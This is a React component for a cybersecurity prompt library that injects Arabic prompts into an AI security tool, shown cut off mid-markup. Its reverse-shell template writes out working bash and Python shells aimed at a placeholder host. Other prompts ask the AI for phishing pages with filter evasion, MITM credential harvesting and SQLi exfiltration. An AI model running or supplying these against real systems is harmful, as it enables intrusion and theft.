import { useEffect, useRef, useState, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { X, Search, Zap, ChevronRight, Copy, Check, Shield, Globe, Bug, Network, Terminal, Eye, Lock, Cpu, Radio, Crosshair, Fingerprint, Waves, Database } from "lucide-react";

interface UseCase {
  id: string;
  category: string;
  categoryColor: string;
  icon: React.ElementType;
  title: string;
  description: string;
  prompt: string;
  tags: string[];
  difficulty: "BASIC" | "MEDIUM" | "ADVANCED" | "ELITE";
}

const DIFFICULTIES: Record<string, string> = {
  BASIC: "text-emerald-400 border-emerald-400/30 bg-emerald-400/10",
  MEDIUM: "text-amber-400 border-amber-400/30 bg-amber-400/10",
  ADVANCED: "text-orange-400 border-orange-400/30 bg-orange-400/10",
  ELITE: "text-red-400 border-red-400/30 bg-red-400/10",
};

const USE_CASES: UseCase[] = [
  // OSINT
  {
    id: "osint-1",
    category: "OSINT",
    categoryColor: "#00e5ff",
    icon: Globe,
    title: "Domain Intelligence Sweep",
    description: "Comprehensive domain OSINT: subdomains, WHOIS, DNS records, SSL certs",
    prompt: `قم بإجراء تحليل OSINT شامل للدومين [TARGET_DOMAIN]. أريد:\n1. جمع السجلات DNS (A, MX, NS, TXT, CNAME)\n2. استخراج معلومات WHOIS والمسجل\n3. اكتشاف الدومينات الفرعية المحتملة\n4. تحليل شهادات SSL/TLS\n5. استخراج عناوين IP والنطاقات المرتبطة\n6. البحث عن تسريبات البيانات المرتبطة\n7. تقرير مرئي منظم بالنتائج`,
    tags: ["WHOIS", "DNS", "Subdomains", "SSL"],
    difficulty: "MEDIUM",
  },
  {
    id: "osint-2",
    category: "OSINT",
    categoryColor: "#00e5ff",
    icon: Fingerprint,
    title: "Social Media Footprint",
    description: "Map digital identity across platforms, email, usernames",
    prompt: `ابحث عن البصمة الرقمية الكاملة للهدف [TARGET_USERNAME/EMAIL]:\n1. اكتشاف الحسابات عبر المنصات (Twitter, LinkedIn, GitHub, Reddit, Telegram)\n2. تحليل أنماط النشاط والتوقيت\n3. استخراج البيانات الوصفية من الصور المنشورة\n4. ربط الحسابات المجهولة بهوية حقيقية\n5. تتبع الإيميلات المرتبطة\n6. تقرير OSINT احترافي بمستوى التهديد`,
    tags: ["SOCMINT", "HUMINT", "Email", "Username"],
    difficulty: "ADVANCED",
  },
  {
    id: "osint-3",
    category: "OSINT",
    categoryColor: "#00e5ff",
    icon: Eye,
    title: "IP Geolocation & ASN Mapping",
    description: "Deep IP intelligence, ASN, BGP routing, threat reputation",
    prompt: `حلل عنوان IP [TARGET_IP] بعمق:\n1. Geolocation دقيق (مدينة، ISP، إحداثيات)\n2. ASN وبيانات BGP routing\n3. سمعة IP في قوائم التهديدات (AbuseIPDB, Shodan, VirusTotal)\n4. التاريخ التشغيلي للعنوان\n5. الخدمات المفتوحة والمنافذ المكشوفة\n6. ارتباطات APT المحتملة\n7. خريطة شبكة ASN كاملة`,
    tags: ["IP", "ASN", "BGP", "Geolocation"],
    difficulty: "MEDIUM",
  },
  // Red Team
  {
    id: "redteam-1",
    category: "Red Team",
    categoryColor: "#e21227",
    icon: Crosshair,
    title: "Attack Surface Enumeration",
    description: "Full attack surface discovery for authorized pen test",
    prompt: `في إطار اختبار اختراق مرخص للهدف [TARGET]، قم بتعداد سطح الهجوم الكامل:\n1. اكتشاف جميع نقاط الدخول (APIs، نماذج، endpoints)\n2. تحليل التقنيات المستخدمة (fingerprinting)\n3. خريطة شبكة كاملة للبنية التحتية\n4. نقاط الضعف في التكوين (misconfigurations)\n5. توثيق نقاط الدخول المحتملة حسب الأولوية\n6. تقرير Attack Surface بتقييم CVSS لكل ثغرة`,
    tags: ["Enumeration", "Fingerprinting", "Recon"],
    difficulty: "ADVANCED",
  },
  {
    id: "redteam-2",
    category: "Red Team",
    categoryColor: "#e21227",
    icon: Shield,
    title: "Phishing Campaign Design",
    description: "Craft convincing spear-phishing scenarios for awareness training",
    prompt: `صمم سيناريو Spear Phishing للتوعية الأمنية (Authorized Red Team) ضد المنظمة [ORG]:\n1. تحليل الأهداف وجمع المعلومات اللازمة للتخصيص\n2. صياغة رسائل بريد إلكتروني مقنعة جداً (5 نماذج مختلفة)\n3. بناء صفحة تصيد احترافية (HTML/CSS)\n4. استراتيجية الإرسال وتفادي مرشحات البريد\n5. مؤشرات النجاح والفشل\n6. التقرير النهائي وتوصيات الحماية`,
    tags: ["Phishing", "Social Eng", "Awareness"],
    difficulty: "ELITE",
  },
  {
    id: "redteam-3",
    category: "Red Team",
    categoryColor: "#e21227",
    icon: Lock,
    title: "Privilege Escalation Playbook",
    description: "Linux/Windows privilege escalation techniques after initial access",
    prompt: `بعد الوصول الأولي (Initial Access) إلى نظام [OS: Linux/Windows]، قدم خطة تصعيد الامتيازات:\n\n**Linux:**\n1. SUID/SGID binaries exploitation\n2. Cron jobs misconfiguration\n3. Sudo rights abuse\n4. Kernel exploits (CVEs حديثة)\n5. PATH hijacking\n6. Writable /etc/passwd\n\n**Windows:**\n1. AlwaysInstallElevated\n2. Unquoted Service Paths\n3. Weak Service Permissions\n4. DLL Hijacking\n5. Token Impersonation\n6. Stored credentials\n\nقدم الأوامر الكاملة لكل تقنية`,
    tags: ["PrivEsc", "Linux", "Windows", "PostExploit"],
    difficulty: "ELITE",
  },
  // Malware Analysis
  {
    id: "malware-1",
    category: "Malware",
    categoryColor: "#a78bfa",
    icon: Bug,
    title: "Static Analysis Report",
    description: "Analyze suspicious binary without execution",
    prompt: `قم بتحليل ثابت (Static Analysis) للعينة المشبوهة [HASH/FILENAME]:\n1. استخراج metadata (strings, imports, exports, sections)\n2. تحليل PE header / ELF structure\n3. التعرف على packers أو obfuscation\n4. استخراج IOCs (IPs، دومينات، مسارات ملفات)\n5. مقارنة بقواعد YARA rules\n6. تقييم درجة الخطورة\n7. MITRE ATT&CK mapping\n8. تقرير مختبر جنائي احترافي`,
    tags: ["Static", "PE Analysis", "YARA", "IOC"],
    difficulty: "ADVANCED",
  },
  {
    id: "malware-2",
    category: "Malware",
    categoryColor: "#a78bfa",
    icon: Cpu,
    title: "Ransomware Deconstruction",
    description: "Reverse engineer ransomware behavior and C2 communication",
    prompt: `حلل سلوك Ransomware [NAME/FAMILY] وافهم آلية عمله:\n1. خوارزمية التشفير المستخدمة (AES-256، RSA، Hybrid)\n2. عملية توليد المفاتيح وإدارتها\n3. بروتوكول C2 والاتصال بالخادم\n4. آلية الانتشار (Lateral Movement)\n5. استمرارية التشغيل (Persistence mechanisms)\n6. مسار التشفير (File targeting logic)\n7. إمكانية فك التشفير (Decryption feasibility)\n8. نقاط الضعف القابلة للاستغلال في التصميم`,
    tags: ["Ransomware", "Crypto", "C2", "Reverse"],
    difficulty: "ELITE",
  },
  {
    id: "malware-3",
    category: "Malware",
    categoryColor: "#a78bfa",
    icon: Radio,
    title: "C2 Framework Analysis",
    description: "Identify and dissect Command & Control infrastructure",
    prompt: `حلل البنية التحتية C2 للعينة المشبوهة:\n1. تحديد بروتوكول الاتصال (HTTP/S، DNS، IRC، P2P)\n2. تحليل حركة المرور المشفرة\n3. استخراج عناوين C2 الخوادم\n4. فهم آلية الأوامر والتحكم\n5. Beaconing patterns وفترات الاتصال\n6. تقنيات التخفي (Domain Fronting، Fast-Flux)\n7. أدوات الكشف الموصى بها (Snort rules، Sigma rules)\n8. توصيات الحجب والتصدي`,
    tags: ["C2", "Network", "Beaconing", "Detection"],
    difficulty: "ELITE",
  },
  // Network Recon
  {
    id: "network-1",
    category: "Network",
    categoryColor: "#10b981",
    icon: Network,
    title: "Full Port Scan Strategy",
    description: "Nmap scan strategy for authorized network enumeration",
    prompt: `اكتب استراتيجية مسح شاملة للشبكة [NETWORK_RANGE] باستخدام nmap:\n\n**مرحلة 1 - Host Discovery:**\n\`nmap -sn -PE -PP -PM [RANGE]\`\n\n**مرحلة 2 - Port Scanning:**\n\`nmap -sS -sV -sC -O -p- --min-rate=5000 [TARGET]\`\n\n**مرحلة 3 - Service Enumeration:**\nسكريبتات NSE المناسبة لكل خدمة مكتشفة\n\n**مرحلة 4 - Vulnerability Scanning:**\n\`nmap --script vuln [TARGET]\`\n\n**مرحلة 5 - التقرير:**\nتنسيق XML للتحليل + HTML للعرض\n\nقدم الأوامر الكاملة مع شرح كل خيار`,
    tags: ["Nmap", "Port Scan", "Service Enum"],
    difficulty: "MEDIUM",
  },
  {
    id: "network-2",
    category: "Network",
    categoryColor: "#10b981",
    icon: Waves,
    title: "Man-in-the-Middle Setup",
    description: "ARP poisoning and traffic interception in lab environment",
    prompt: `في بيئة مختبر معزولة، اشرح إعداد هجوم MITM:\n\n**ARP Poisoning:**\n1. Ettercap / arpspoof setup\n2. إعادة توجيه حركة المرور\n3. SSL Stripping مع sslstrip2\n4. Bettercap للهجمات المتقدمة\n\n**DNS Spoofing:**\n1. تحويل الدومينات المستهدفة\n2. Credential harvesting\n\n**الكشف والحماية:**\n1. أدوات كشف ARP Spoofing\n2. Dynamic ARP Inspection\n3. توصيات الحماية\n\nقدم أوامر كاملة وقابلة للتشغيل`,
    tags: ["ARP", "MITM", "SSL Strip", "DNS"],
    difficulty: "ADVANCED",
  },
  // Web App
  {
    id: "webapp-1",
    category: "Web App",
    categoryColor: "#fbbf24",
    icon: Globe,
    title: "OWASP Top 10 Assessment",
    description: "Systematic web app vulnerability assessment following OWASP",
    prompt: `قم بتقييم أمني شامل لتطبيق الويب [URL] وفق OWASP Top 10 2021:\n\n1. **A01 - Broken Access Control:** تحقق من IDOR، path traversal، JWT manipulation\n2. **A02 - Cryptographic Failures:** تحليل TLS، تخزين البيانات الحساسة\n3. **A03 - SQL Injection:** اختبار جميع نقاط الإدخال\n4. **A04 - Insecure Design:** تحليل منطق التطبيق\n5. **A05 - Security Misconfiguration:** Headers، CORS، Error messages\n6. **A06 - Vulnerable Components:** تحليل المكتبات والإصدارات\n7. **A07 - Authentication Failures:** Brute force، Session management\n8. **A08 - Integrity Failures:** Deserialization، Supply chain\n9. **A09 - Logging Failures:** تقييم نظام المراقبة\n10. **A10 - SSRF:** اختبار Server-Side Request Forgery\n\nأوامر Burp Suite + curl لكل فئة`,
    tags: ["OWASP", "SQLi", "XSS", "IDOR"],
    difficulty: "ADVANCED",
  },
  {
    id: "webapp-2",
    category: "Web App",
    categoryColor: "#fbbf24",
    icon: Database,
    title: "SQL Injection Deep Dive",
    description: "SQLi discovery, exploitation, and data extraction techniques",
    prompt: `اشرح SQL Injection بعمق للهدف المرخص [TARGET_PARAM]:\n\n**اكتشاف:**\n1. أوامر sqlmap الكاملة لجميع أنواع SQLi\n2. الاختبار اليدوي لـ Error-based، Boolean-blind، Time-based\n3. WAF bypass techniques\n\n**الاستغلال:**\n1. استخراج قاعدة البيانات، الجداول، الأعمدة\n2. استخراج credentials\n3. File read/write عبر SQLi\n4. OS command execution (xp_cmdshell)\n5. Out-of-band exfiltration\n\n**الوقاية:**\n1. Prepared statements\n2. Input validation\n3. WAF rules\n\nأوامر sqlmap + payloads يدوية كاملة`,
    tags: ["SQLi", "sqlmap", "WAF Bypass", "UNION"],
    difficulty: "ELITE",
  },
  // Forensics
  {
    id: "forensics-1",
    category: "Forensics",
    categoryColor: "#0ea5e9",
    icon: Search,
    title: "Incident Response Playbook",
    description: "Step-by-step IR for compromised Linux/Windows system",
    prompt: `تنفيذ Incident Response على النظام المخترق [OS]:\n\n**مرحلة الاحتواء الأولي:**\n1. عزل النظام عن الشبكة\n2. حفظ الذاكرة المؤقتة (RAM Dump)\n3. وقت وتاريخ الاختراق\n\n**جمع الأدلة:**\n1. تصوير القرص الصلب forensically\n2. سجلات النظام (Event Logs، Syslog)\n3. قائمة العمليات والاتصالات الشبكية النشطة\n4. Autoruns وبرامج بدء التشغيل\n5. الملفات المعدلة حديثاً\n\n**التحليل:**\n1. Timeline analysis\n2. البحث عن IOCs في السجلات\n3. تحليل الذاكرة (Volatility commands)\n4. Artifact extraction\n\n**التقرير النهائي:**\nجدول زمني كامل للحادث + التوصيات`,
    tags: ["IR", "Forensics", "Volatility", "Timeline"],
    difficulty: "ADVANCED",
  },
  {
    id: "forensics-2",
    category: "Forensics",
    categoryColor: "#0ea5e9",
    icon: Terminal,
    title: "Memory Forensics Analysis",
    description: "Extract artifacts from RAM dump using Volatility framework",
    prompt: `حلل RAM dump باستخدام Volatility 3:\n\n**الأوامر الأساسية:**\n\`\`\`\nvolatility3 -f memory.dmp windows.info\nvolatility3 -f memory.dmp windows.pslist\nvolatility3 -f memory.dmp windows.pstree\nvolatility3 -f memory.dmp windows.cmdline\nvolatility3 -f memory.dmp windows.netscan\nvolatility3 -f memory.dmp windows.malfind\nvolatility3 -f memory.dmp windows.dlllist\n\`\`\`\n\n**البحث عن IOCs:**\n1. استخراج hashes من العمليات\n2. فحص الاتصالات الشبكية\n3. اكتشاف Code Injection\n4. استخراج كلمات المرور (hashdump)\n5. Registry artifacts\n6. Browser history extraction\n\nقدم workflow كامل قابل للتنفيذ`,
    tags: ["Volatility", "Memory", "RAM", "Artifacts"],
    difficulty: "ADVANCED",
  },
  // Crypto & Encoding
  {
    id: "crypto-1",
    category: "Crypto",
    categoryColor: "#f97316",
    icon: Lock,
    title: "Crypto Weakness Audit",
    description: "Identify weak cryptographic implementations in code/system",
    prompt: `افحص التطبيق [TARGET] لاكتشاف ضعف التشفير:\n\n**الخوارزميات الضعيفة:**\n1. MD5/SHA1 للكلمات المرور\n2. DES/3DES للتشفير\n3. RC4 في SSL\n4. RSA مفاتيح أقل من 2048-bit\n\n**مشاكل التطبيق:**\n1. Static IV في AES-CBC\n2. ECB mode usage\n3. Padding Oracle vulnerability\n4. Timing attacks\n5. Weak random number generation\n\n**JWT Analysis:**\n1. Algorithm confusion (RS256→HS256)\n2. None algorithm attack\n3. Weak secret brute force\n\n**التوصيات:**\nمكتبات وأساليب التشفير الصحيحة لكل حالة`,
    tags: ["Crypto", "JWT", "AES", "Hash"],
    difficulty: "ADVANCED",
  },
  // Shell & Payloads
  {
    id: "shell-1",
    category: "Shell Gen",
    categoryColor: "#00ff41",
    icon: Terminal,
    title: "Reverse Shell Generator",
    description: "Generate reverse shells for authorized testing across all languages",
    prompt: `اولد Reverse Shell connections لاختبار مخول للنظام [TARGET_IP:PORT]:\n\n**Bash:**\n\`bash -i >& /dev/tcp/[IP]/[PORT] 0>&1\`\n\n**Python 3:**\n\`\`\`python\nimport socket,subprocess,os\ns=socket.socket()\ns.connect(("[IP]",[PORT]))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(["/bin/sh","-i"])\n\`\`\`\n\n**PowerShell:**\n\`\`\`powershell\n$client=New-Object System.Net.Sockets.TCPClient("[IP]",[PORT])\n$stream=$client.GetStream()\n...\n\`\`\`\n\n**أيضاً:** PHP، Ruby، Perl، Golang، Netcat، Socat، Java\n**Msfvenom payloads:** Windows EXE، Linux ELF، APK، PHP webshell\n**Listener:** Metasploit + Netcat setup\n\nاستبدل [IP] و [PORT] بالقيم الصحيحة`,
    tags: ["RevShell", "msfvenom", "Bash", "Python"],
    difficulty: "MEDIUM",
  },
  // AI Agent
  {
    id: "agent-1",
    category: "AI Agent",
    categoryColor: "#e21227",
    icon: Cpu,
    title: "Autonomous OSINT Agent",
    description: "Design a multi-step AI agent for automated target research",
    prompt: `صمم AI Agent مستقل لتنفيذ OSINT على [TARGET] بشكل آلي:\n\n**المرحلة 1 — التخطيط:**\n- تحديد الأهداف والمعلومات المطلوبة\n- اختيار الأدوات والمصادر\n\n**المرحلة 2 — التنفيذ الآلي:**\n1. WHOIS + DNS lookup\n2. Shodan/Censys API queries\n3. GitHub dorks للتسريبات\n4. Google dorks المتقدمة\n5. Social media scraping\n6. Pastebin/Dark web search\n\n**المرحلة 3 — الربط والتحليل:**\n- ربط النتائج تلقائياً\n- كشف الأنماط والعلاقات\n- تصنيف المخاطر\n\n**المرحلة 4 — التقرير:**\n- تقرير HTML/PDF احترافي\n- خريطة مرئية للعلاقات\n- توصيات قابلة للتنفيذ\n\nقدم كود Python كامل للـ Agent`,
    tags: ["Agent", "Automation", "OSINT", "Python"],
    difficulty: "ELITE",
  },
];

const CATEGORIES = ["ALL", "OSINT", "Red Team", "Malware", "Network", "Web App", "Forensics", "Crypto", "Shell Gen", "AI Agent"];

const CATEGORY_COLORS: Record<string, string> = {
  OSINT: "#00e5ff",
  "Red Team": "#e21227",
  Malware: "#a78bfa",
  Network: "#10b981",
  "Web App": "#fbbf24",
  Forensics: "#0ea5e9",
  Crypto: "#f97316",
  "Shell Gen": "#00ff41",
  "AI Agent": "#e21227",
};

interface Props {
  open: boolean;
  onOpenChange: (v: boolean) => void;
  onInject?: (prompt: string) => void;
}

export function UseCaseLibraryModal({ open, onOpenChange, onInject }: Props) {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const rafRef = useRef<number>(0);
  const [search, setSearch] = useState("");
  const [category, setCategory] = useState("ALL");
  const [copied, setCopied] = useState<string | null>(null);
  const [hovered, setHovered] = useState<string | null>(null);
  const [expanded, setExpanded] = useState<string | null>(null);
  const particlesRef = useRef<{ x: number; y: number; vx: number; vy: number; life: number; maxLife: number; size: number; color: string }[]>([]);

  // Canvas 3D holographic background
  useEffect(() => {
    if (!open) return;
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d")!;

    const resize = () => {
      canvas.width = canvas.offsetWidth;
      canvas.height = canvas.offsetHeight;
    };
    resize();
    window.addEventListener("resize", resize);

    const COLORS = ["#e21227", "#00e5ff", "#a78bfa", "#10b981", "#fbbf24"];

    // Init particles
    particlesRef.current = Array.from({ length: 60 }, () => ({
      x: Math.random() * canvas.width,
      y: Math.random() * canvas.height,
      vx: (Math.random() - 0.5) * 0.4,
      vy: (Math.random() - 0.5) * 0.4,
      life: Math.random() * 200,
      maxLife: 200 + Math.random() * 300,
      size: 1 + Math.random() * 2,
      color: COLORS[Math.floor(Math.random() * COLORS.length)],
    }));

    let gridOffset = 0;
    let scanLine = 0;

    const draw = () => {
      const W = canvas.width;
      const H = canvas.height;
      ctx.clearRect(0, 0, W, H);

      // Dark background
      ctx.fillStyle = "#050505";
      ctx.fillRect(0, 0, W, H);

      // Enhanced 3D perspective grid with dual-color and depth
      gridOffset = (gridOffset + 0.55) % 60;
      const vanishX = W / 2;
      const vanishY = H * 0.28;
      const gridLines = 28;

      ctx.save();
      // Primary radial-perspective lines
      for (let i = 0; i <= gridLines; i++) {
        const t = i / gridLines;
        const xBottom = t * W;
        const center = Math.abs(t - 0.5) * 2; // 0 at center, 1 at edge
        const alpha = 0.02 + (1 - center) * 0.09;
        const useBlue = i % 7 === 0;
        ctx.strokeStyle = useBlue ? `rgba(59,130,246,${alpha * 0.8})` : `rgba(226,18,39,${alpha})`;
        ctx.lineWidth = i % 7 === 0 ? 0.8 : 0.4;
        ctx.beginPath();
        ctx.moveTo(xBottom, H);
        ctx.lineTo(vanishX, vanishY);
        ctx.stroke();
      }

      // Horizontal perspective rings with scroll
      const horizLines = 16;
      for (let j = 0; j <= horizLines; j++) {
        const frac = (j / horizLines + gridOffset / (H * 0.72)) % 1;
        const perspY = vanishY + frac * (H - vanishY);
        const halfW = ((perspY - vanishY) / (H - vanishY)) * (W * 0.54);
        const alpha = frac * 0.14;
        const accent = j % 4 === 0;
        ctx.strokeStyle = accent ? `rgba(0,229,255,${alpha * 0.7})` : `rgba(226,18,39,${alpha})`;
        ctx.lineWidth = accent ? 0.8 : 0.4;
        ctx.beginPath();
        ctx.moveTo(vanishX - halfW, perspY);
        ctx.lineTo(vanishX + halfW, perspY);
        ctx.stroke();
      }

      // Vanishing point glow
      const vpGrad = ctx.createRadialGradient(vanishX, vanishY, 0, vanishX, vanishY, 120);
      vpGrad.addColorStop(0, "rgba(226,18,39,0.12)");
      vpGrad.addColorStop(0.5, "rgba(226,18,39,0.04)");
      vpGrad.addColorStop(1, "rgba(0,0,0,0)");
      ctx.fillStyle = vpGrad;
      ctx.fillRect(vanishX - 120, vanishY - 80, 240, 200);

      // Corner glows
      const cg1 = ctx.createRadialGradient(0, H, 0, 0, H, W * 0.4);
      cg1.addColorStop(0, "rgba(226,18,39,0.07)"); cg1.addColorStop(1, "rgba(0,0,0,0)");
      ctx.fillStyle = cg1; ctx.fillRect(0, 0, W, H);
      const cg2 = ctx.createRadialGradient(W, H, 0, W, H, W * 0.4);
      cg2.addColorStop(0, "rgba(59,130,246,0.05)"); cg2.addColorStop(1, "rgba(0,0,0,0)");
      ctx.fillStyle = cg2; ctx.fillRect(0, 0, W, H);
      ctx.restore();

      // Floating particles with connections
      const pts = particlesRef.current;
      pts.forEach((p) => {
        p.x += p.vx;
        p.y += p.vy;
        p.life++;
        if (p.x < 0 || p.x > W) p.vx *= -1;
        if (p.y < 0 || p.y > H) p.vy *= -1;
        if (p.life > p.maxLife) {
          p.x = Math.random() * W;
          p.y = Math.random() * H;
          p.life = 0;
          p.color = COLORS[Math.floor(Math.random() * COLORS.length)];
        }

        const alpha = Math.sin((p.life / p.maxLife) * Math.PI) * 0.7;
        ctx.beginPath();
        ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
        ctx.fillStyle = p.color + Math.floor(alpha * 255).toString(16).padStart(2, "0");
        ctx.fill();
      });

      // Draw connections between nearby particles
      for (let i = 0; i < pts.length; i++) {
        for (let j = i + 1; j < pts.length; j++) {
          const dx = pts[i].x - pts[j].x;
          const dy = pts[i].y - pts[j].y;
          const dist = Math.sqrt(dx * dx + dy * dy);
          if (dist < 80) {
            const alpha = (1 - dist / 80) * 0.12;
            ctx.strokeStyle = `rgba(226,18,39,${alpha})`;
            ctx.lineWidth = 0.5;
            ctx.beginPath();
            ctx.moveTo(pts[i].x, pts[i].y);
            ctx.lineTo(pts[j].x, pts[j].y);
            ctx.stroke();
          }
        }
      }

      // Horizontal scan line
      scanLine = (scanLine + 1) % H;
      const scanGrad = ctx.createLinearGradient(0, scanLine - 40, 0, scanLine + 5);
      scanGrad.addColorStop(0, "rgba(226,18,39,0)");
      scanGrad.addColorStop(1, "rgba(226,18,39,0.04)");
      ctx.fillStyle = scanGrad;
      ctx.fillRect(0, scanLine - 40, W, 45);

      // Top hexagon grid overlay (more visible)
      ctx.save();
      ctx.globalAlpha = 0.04;
      ctx.strokeStyle = "#00e5ff";
      ctx.lineWidth = 0.5;
      const hexR = 30;
      const hexH = hexR * Math.sqrt(3);
      for (let hx = -hexR; hx < W + hexR; hx += hexR * 3) {
        for (let hy = -hexH; hy < H * 0.6 + hexH; hy += hexH) {
          [[hx, hy], [hx + hexR * 1.5, hy + hexH / 2]].forEach(([cx, cy]) => {
            ctx.beginPath();
            for (let k = 0; k < 6; k++) {
              const angle = (Math.PI / 3) * k - Math.PI / 6;
              const px = cx + hexR * Math.cos(angle);
              const py = cy + hexR * Math.sin(angle);
              k === 0 ? ctx.moveTo(px, py) : ctx.lineTo(px, py);
            }
            ctx.closePath();
            ctx.stroke();
          });
        }
      }
      ctx.restore();

      rafRef.current = requestAnimationFrame(draw);
    };

    draw();
    return () => {
      cancelAnimationFrame(rafRef.current);
      window.removeEventListener("resize", resize);
    };
  }, [open]);

  const filtered = USE_CASES.filter((uc) => {
    const matchCat = category === "ALL" || uc.category === category;
    const q = search.toLowerCase();
    const matchSearch = !q || uc.title.toLowerCase().includes(q) || uc.description.toLowerCase().includes(q) || uc.tags.some((t) => t.toLowerCase().includes(q));
    return matchCat && matchSearch;
  });

  const handleCopy = useCallback((id: string, text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(id);
    setTimeout(() => setCopied(null), 2000);
  }, []);

  const handleInject = useCallback((prompt: string) => {
    if (onInject) {
      onInject(prompt);
    } else {
      window.dispatchEvent(new CustomEvent("kali:inject-prompt", { detail: { prompt } }));
    }
    onOpenChange(false);
  }, [onInject, onOpenChange]);

  if (!open) return null;

  return (
    <AnimatePresence>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        className="fixed inset-0 z-50 flex items-stretch justify-center"
        style={{ background: "rgba(0,0,0,0.85)", backdropFilter: "blur(8px)" }}
        onClick={(e) => { if (e.target === e.currentTarget) onOpenChange(false); }}
      >
        <motion.div
          initial={{ opacity: 0, scale: 0.93, y: 32, rotateX: -6 }}
          animate={{ opacity: 1, scale: 1, y: 0, rotateX: 0 }}
          exit={{ opacity: 0, scale: 0.95, y: 20, rotateX: 3 }}
          transition={{ type: "spring", stiffness: 280, damping: 28 }}
          className="relative w-full max-w-7xl m-4 rounded-2xl overflow-hidden flex flex-col"
          style={{
            border: "1px solid rgba(226,18,39,0.3)",
            boxShadow: "0 0 0 1px rgba(255,255,255,0.04), 0 0 120px rgba(226,18,39,0.18), 0 0 60px rgba(226,18,39,0.1), 0 40px 80px rgba(0,0,0,0.9)",
            background: "#060606",
            transformStyle: "preserve-3d",
          }}
        >
          {/* Animated Canvas Background */}
          <canvas
            ref={canvasRef}
            className="absolute inset-0 w-full h-full pointer-events-none"
            style={{ zIndex: 0 }}
          />

          {/* Header */}
          <div className="relative z-10 flex items-center justify-between px-6 py-4 border-b border-white/5" style={{ background: "linear-gradient(180deg, rgba(226,18,39,0.08) 0%, transparent 100%)" }}>
            <div className="flex items-center gap-4">
              {/* 3D rotating icon */}
              <div className="relative w-10 h-10 flex items-center justify-center">
                <motion.div
                  animate={{ rotateY: [0, 360] }}
                  transition={{ duration: 4, repeat: Infinity, ease: "linear" }}
                  className="absolute inset-0 rounded-lg"
                  style={{ background: "linear-gradient(135deg, #e21227, #6d0112)", boxShadow: "0 0 20px rgba(226,18,39,0.5)" }}
                />
                <Zap className="relative z-10 w-5 h-5 text-white" />
              </div>
              <div>
                <div className="flex items-center gap-2">
                  <span className="text-base font-bold text-white tracking-wider font-mono uppercase">Use-Case Library</span>
                  <span className="text-[10px] font-mono px-2 py-0.5 rounded border text-red-400 border-red-400/30 bg-red-400/10">
                    {USE_CASES.length} SCENARIOS
                  </span>
                </div>
                <p className="text-[11px] text-muted-foreground font-mono mt-0.5">مكتبة سيناريوهات الأمن السيبراني — جاهزة للحقن الفوري</p>
              </div>
            </div>
            <button
              onClick={() => onOpenChange(false)}
              className="w-8 h-8 rounded-lg flex items-center justify-center text-muted-foreground hover:text-white hover:bg-white/10 transition-colors"
            >
              <X className="w-4 h-4" />
            </button>
          </div>

          {/* Search + Categories */}
          <div className="relative z-10 px-6 py-3 border-b border-white/5 space-y-3" style={{ background: "rgba(0,0,0,0.4)" }}>
            {/* Search */}
            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-muted-foreground" />
              <input
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                placeholder="ابحث في السيناريوهات..."
                className="w-full bg-white/5 border border-white/10 rounded-lg pl-9 pr-4 py-2 text-sm text-white placeholder:text-muted-foreground focus:outline-none focus:border-red-500/40 font-mono transition-colors"
              />
            </div>
            {/* Category tabs */}
            <div className="flex items-center gap-2 flex-wrap">
              {CATEGORIES.map((cat) => {
                const active = category === cat;
                const color = cat === "ALL" ? "#e21227" : CATEGORY_COLORS[cat] || "#e21227";
                return (
                  <button
                    key={cat}
                    onClick={() => setCategory(cat)}
                    className="px-3 py-1 rounded-md text-[11px] font-mono font-bold uppercase transition-all duration-200"
                    style={{
                      border: `1px solid ${active ? color : "rgba(255,255,255,0.1)"}`,
                      background: active ? `${color}20` : "transparent",
                      color: active ? color : "#888",
                      boxShadow: active ? `0 0 12px ${color}30` : "none",
                    }}
                  >
                    {cat}
                  </button>
                );
              })}
              <span className="ml-auto text-[11px] text-muted-foreground font-mono">{filtered.length} نتيجة</span>
            </div>
          </div>

          {/* Cards Grid */}
          <div className="relative z-10 flex-1 overflow-y-auto p-6" style={{ scrollbarWidth: "thin", scrollbarColor: "#e2122730 transparent" }}>
            <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
              <AnimatePresence mode="popLayout">
                {filtered.map((uc, i) => {
                  const isHovered = hovered === uc.id;
                  const isExpanded = expanded === uc.id;
                  const color = CATEGORY_COLORS[uc.category] || "#e21227";
                  const Icon = uc.icon;

                  return (
                    <motion.div
                      key={uc.id}
                      layout
                      initial={{ opacity: 0, y: 24, rotateX: -12, scale: 0.96 }}
                      animate={{ opacity: 1, y: 0, rotateX: 0, scale: 1 }}
                      exit={{ opacity: 0, scale: 0.88, rotateX: 8 }}
                      transition={{ delay: i * 0.028, type: "spring", stiffness: 320, damping: 26 }}
                      onMouseEnter={() => setHovered(uc.id)}
                      onMouseLeave={() => setHovered(null)}
                      style={{
                        transformStyle: "preserve-3d",
                        perspective: "700px",
                        transform: isHovered
                          ? "translateY(-7px) rotateX(3.5deg) rotateY(-1.5deg) scale(1.025)"
                          : "translateY(0) rotateX(0) rotateY(0) scale(1)",
                        transition: "transform 0.32s cubic-bezier(0.34, 1.56, 0.64, 1)",
                        willChange: "transform",
                      }}
                    >
                      <div
                        className="rounded-xl overflow-hidden cursor-pointer relative"
                        style={{
                          border: `1px solid ${isHovered ? color + "55" : "rgba(255,255,255,0.07)"}`,
                          background: isHovered
                            ? `linear-gradient(145deg, rgba(${hexToRgb(color)},0.1) 0%, rgba(10,10,16,0.97) 55%, rgba(${hexToRgb(color)},0.04) 100%)`
                            : "rgba(11,11,17,0.95)",
                          boxShadow: isHovered
                            ? `0 12px 40px ${color}28, 0 0 0 1px ${color}30, 0 2px 60px ${color}10, inset 0 1px 0 rgba(255,255,255,0.06)`
                            : "0 2px 12px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.03)",
                          transition: "all 0.32s ease",
                        }}
                        onClick={() => setExpanded(isExpanded ? null : uc.id)}
                      >
                        {/* Holographic shimmer on hover */}
